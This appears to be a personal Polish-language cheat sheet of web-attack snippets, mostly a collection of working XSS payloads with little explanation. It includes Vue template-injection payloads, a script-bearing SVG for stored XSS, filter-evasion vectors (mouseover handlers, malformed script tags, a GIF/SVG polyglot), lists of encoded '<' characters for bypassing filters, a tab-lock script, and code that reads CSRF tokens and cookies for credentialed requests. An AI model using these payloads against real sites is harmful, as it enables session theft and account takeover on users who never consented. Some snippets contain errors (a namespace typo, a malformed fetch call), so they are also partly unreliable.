### Extra pierdoły:

## Linki:
- https://brutelogic.com.br/blog/file-upload-xss/
- https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
- https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromgif
- https://brutelogic.com.br/blog/leveraging-self-xss/
- https://jira.atlassian.com/browse/JRASERVER-72115?src=confmacro
- https://asecurityteam.bitbucket.io/cvss_v3/#CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N
- https://security.snyk.io/vuln/SNYK-JS-SIMPLEMARKDOWN-173788
- https://www.rcesecurity.com/2015/09/cve-2015-5956-bypassing-the-typo3-core-xss-filter/

### Snippets:
Pobierz losowy obrazek 1000 x 1000px \
```wget https://picsum.photos/1000```

Szybki test embeda svg
```https://brutelogic.com.br/poc.svg```

=========

### JS Snippets:
> Anti refresh / redirect tab lock.
```js
window.onbeforeunload = function(event) {
  event.preventDefault();
  event.returnValue = 'Are you sure you want to leave?';
  return 'Are you sure you want to leave?';
};
```
> Basic payload Vue
```vue
{{ alert("UwU") }}
```
> Basic payload in-element
```vue
<div v-html="'<script>alert(\"UwU\")<\/script>'"></div>
```

> Parse tokens and cookies in browser for fetch requests
```js
// Parse CSRF token and cookies from the current page
  const csrfToken = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content');
  const cookies = document.cookie;

// headers
headers: {
  "accept": "application/json",
  "x-csrf-token": csrfToken,
  "x-xsrf-token": cookies,
  "X-Requested-With": "XMLHttpRequest",
  "cache-control": "no-cache",
  "pragma": "no-cache",
  "credentials": "include"
}
```

### [CORS 101](https://medium.com/@cybersphere/fetch-api-the-ultimate-guide-to-cors-and-no-cors-cbcef88d371e)
> CORS
```js
// CORS
fetch('https://example.com/api/data', {
  mode:  'cors' 
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    key1: 'value1',
    key2: 'value2'
  })
})
.then(response => response.json())
.then(data => console.log(data))
.catch(error => console.error(error));
```

> NO CORS
```js
// NO CORS
fetch('https://example.com/api/data', {
  mode: 'no-cors'
})
  .then(response => console.log(response))
  .catch(error => console.error(error));
```

### Stored XSS [SVG / XML]
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/200/svg">
   <polygon id="triangle" points="10,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      alert('UwU');
   </script>
</svg>
```
> XSS On Mouse Hover Event
```js
<IMG SRC=# onmouseover="alert('UwU')">
```
> Extraneus Open Brackets
```js
<<SCRIPT>alert("UwU");//\<</SCRIPT>
```
> Img Embed XSS
```js
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
```
> IP vs Hostname / URL Encoded
```js
<A HREF="http://66.102.7.147/">XSS</A>
```
```js
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
```

> Parameter pollution (share)
```js
a href="/Share?content_type=1&title=<%=Encode.forHtmlAttribute(untrusted content title)%>">Share</a>
```

> "Gif" XSS
```js
GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
```

### Character Escape Sequence
```js
<
%3C
&lt
&lt;
&LT
&LT;
&#60;
&#060;
&#0060;
&#00060;
&#000060;
&#0000060;
&#60;
&#060;
&#0060;
&#00060;
&#000060;
&#0000060;
&#x3c;
&#x03c;
&#x003c;
&#x0003c;
&#x00003c;
&#x000003c;
&#x3c;
&#x03c;
&#x003c;
&#x0003c;
&#x00003c;
&#x000003c;
&#X3c;
&#X03c;
&#X003c;
&#X0003c;
&#X00003c;
&#X000003c;
&#X3c;
&#X03c;
&#X003c;
&#X0003c;
&#X00003c;
&#X000003c;
&#x3C;
&#x03C;
&#x003C;
&#x0003C;
&#x00003C;
&#x000003C;
&#x3C;
&#x03C;
&#x003C;
&#x0003C;
&#x00003C;
&#x000003C;
&#X3C;
&#X03C;
&#X003C;
&#X0003C;
&#X00003C;
&#X000003C;
&#X3C;
&#X03C;
&#X003C;
&#X0003C;
&#X00003C;
&#X000003C;
\x3c
\x3C
\u003c
\u003C
```

**Alternatywne kryptonimy projektu xDDD**
> DUPA - Dzidowy Uniwersalny Pakiet Automatyzacji
